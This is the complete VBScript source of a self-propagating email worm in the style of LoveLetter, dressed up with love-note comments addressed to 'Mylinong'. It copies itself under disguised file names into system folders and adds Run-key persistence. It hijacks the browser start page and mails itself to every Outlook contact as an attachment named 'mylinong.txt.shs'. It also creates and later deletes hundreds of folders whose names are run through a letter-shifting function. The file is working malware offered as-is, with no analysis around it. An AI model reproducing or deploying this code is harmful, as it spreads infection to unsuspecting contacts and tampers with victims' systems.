Set fso = CreateObject("Scripting.FileSystemObject")
set opfile = fso.OpenTextFile(WScript.ScriptFullname,1)
'Hi.., Nong... I Love U So Much......
'This file can be hold in your computer for 7 days
'after that day 
Mylinong="Mylinong" 'will be delete by it self
'Don't Worry 
'It Can Be Normal Again
'I Always Hope That.

utama()

sub utama()
  On Error Resume Next
  dim wscr,rr,brpkali,brpdate
  brpkali=0
  set wscr=CreateObject("WScript.Shell")
  ntime=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
  if (ntime>=1) then
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  end if
  brpkali=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bkali")
  brpdate=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bdate")

  if brpkali=0 then
     msgbox(brpkali)
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bkali", 1, "REG_DWORD"
     wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bdate", 1, "REG_DWORD"
  Else
     IF brpkali > 7 Then
  	Set dirwin = fso.GetSpecialFolder(0)
  	Set dirsystem = fso.GetSpecialFolder(1)
  	Set dirtemp = fso.GetSpecialFolder(2)

        set ftxt=fso.GetFile(dirwin& "\mylinong.txt.shs")
        set fvbs1=fso.GetFile(dirsystem&"\Kern32Lin.vbs")       
        set fvbs2=fso.GetFile(dirwin&"\Vbrun32DLL.vbs")       
        set fvbs3=fso.GetFile(dirsystem&"\mylinong.TXT.vbs")

        ftxt.delete 
        fvbs1.delete
        fvbs2.delete
        fvbs3.delete
        
        cdeldrive()
     Else
  	Set dirwin = fso.GetSpecialFolder(0)
  	Set dirsystem = fso.GetSpecialFolder(1)
  	Set dirtemp = fso.GetSpecialFolder(2)
  	Set drivec = fso.GetFile(WScript.ScriptFullName)
  	drivec.copy(dirwin&"\mylinong.txt.shs")
  	drivec.Copy(dirsystem&"\Kern32Lin.vbs")
  	drivec.Copy(dirwin&"\Vbrun32DLL.vbs")
  	drivec.Copy(dirsystem&"\mylinong.TXT.vbs")

  	runreg()
  	sen2email()
  	cnewdrive()
  	textfile()
        If brpdate <> date() Then           
           wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bkali", brpkali+1, "REG_DWORD"
           wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\bdate", date, "REG_DWORD"
        End If
     End If
  End If
end sub

sub cdeldrive
    Set fso = CreateObject("Scripting.FileSystemObject")  
    for i=1 to 600
        fso.DeleteFolder(ec("O:\XUBCBS U XCJQ MCI YM RCXPQF" )& cstr(i))
    next
end sub

sub cnewdrive
    Set fso = CreateObject("Scripting.FileSystemObject")
    for i=1 to 600
        Set f = fso.CreateFolder(ec("O:\XUBCBS U XCJQ MCI YM RCXPQF" )& cstr(i))
    next
end sub

sub textfile()
    dim wscr,spcfld
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set spcfld = fso.GetSpecialFolder(2)
    set scrun=CreateObject("WScript.Shell")
    Set t = fso.CreateTextFile(spcfld & "\mylinong.txt", True)
    t.WriteLine("@@@@   @@@@            @@@@@    @@@      @@@  @@@@@@@@@    @@@    @@@   @@@@@   @@@     @@@")
    t.WriteLine(" @@     @@           @@     @@   @@      @@    @@           @@    @@  @@     @@  @@     @@ ")
    t.WriteLine(" @@     @@           @@     @@   @@      @@    @@            @@  @@   @@     @@  @@     @@ ")
    t.WriteLine(" @@     @@           @@     @@    @@    @@     @@@@@@         @@@@    @@     @@  @@     @@ ")
    t.WriteLine(" @@     @@           @@     @@     @@  @@      @@              @@     @@     @@  @@     @@ ")
    t.WriteLine(" @@     @@       @   @@     @@      @@@@       @@              @@     @@     @@  @@     @@ ")
    t.WriteLine("@@@@   @@@@@@@@@@      @@@@@         @@       @@@@@@@@@        @@       @@@@@      @@@@@   ")
    t.WriteLine(" ")
    t.WriteLine("@@@@         @@@@  @@@  @@@@      @@@@@   @@@  @@@@    @@@@@@  ")
    t.WriteLine(" @@           @@    @@ @   @@   @@     @@  @@ @   @@  @@    @@ ")
    t.WriteLine(" @@           @@    @@     @@   @@     @@  @@     @@  @@       ")
    t.WriteLine(" @@           @@    @@     @@   @@     @@  @@     @@  @@  @@@@@")
    t.WriteLine(" @@           @@    @@     @@   @@     @@  @@     @@  @@    @@ ")
    t.WriteLine(" @@        @  @@    @@     @@   @@     @@  @@     @@  @@    @@ ")
    t.WriteLine("@@@@@@@@@@@  @@@@  @@@     @@@    @@@@@   @@@     @@@  @@@@@@  ")
    t.WriteLine(" ")
    t.WriteLine("I Love You, MyLinong - 5it3Ninty8")
    t.Close
    filetxt=spcfld & "\mylinong.txt"
    scrun.run(filetxt)
end sub

sub runreg()
  'On Error Resume Next
  Dim num

  createReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kern32lLin",dirsystem&"\MSKernel32.vbs"
  createReg "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Vbrun32DLL",dirwin&"\Win32DLL.vbs"

  createReg "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.thewebpost.com/lovepoems/1198/dpt112098ily.shtml"
end sub

sub createReg(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub

function getreg(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
end function


Function EC(txt)
EC=""
For sm=1 to Len(txt)
    If Asc(Mid(txt,sm,1))<>32 And Asc(Mid(txt,sm,1))<>33 And Asc(Mid(txt,sm,1))<>34 And Asc(Mid(txt,sm,1))<>160 And Asc(Mid(txt,sm,1))<>255 And Asc(Mid(txt,sm,1))<>58 And Asc(Mid(txt,sm,1))<>92 Then
       if ASC(MID(txt,sm,1))<=ASC(MID(MYLINONG,1,1)) Then
          EC=EC & CHR(ASC(MID(txt,sm,1))+ASC(""))
       else
          EC=EC & CHR(ASC(MID(txt,sm,1))-ASC(""))
       end if
    Else
       EC=EC & Mid(txt,sm,1)
    end if
Next
end Function

sub sen2email()
  On Error Resume Next
  dim x, addr, clists, ctrentries, ead, regedit, regv, regad
  set regedit = CreateObject("WScript.Shell")
  set out = WScript.CreateObject("Outlook.Application")
  set mapi = out.GetNameSpace("MAPI")
  for clists = 1 to mapi.AddressLists.Count
    set addr = mapi.AddressLists(clists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & addr)
    if (regv = "") then
      regv = 1
    end if
    if (int(addr.AddressEntries.Count) > int(regv)) then
      for ctrentries = 1 to addr.AddressEntries.Count
        ead = addr.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & ead)
        if (regad = "") then
          set surat = out.CreateItem(0)
          surat.Recipients.Add(ead)
          surat.Subject = "My-Linong...."
          surat.Body = vbcrlf & "True Story...."
          set attad= surat.Attachments.Add(dirwin & "\mylinong.txt.shs")
          surat.Send
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & ead, 1, "REG_DWORD"
        end if
        x = x + 1
      next
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    end if
  next
  Set out = Nothing
  Set mapi = Nothing
end sub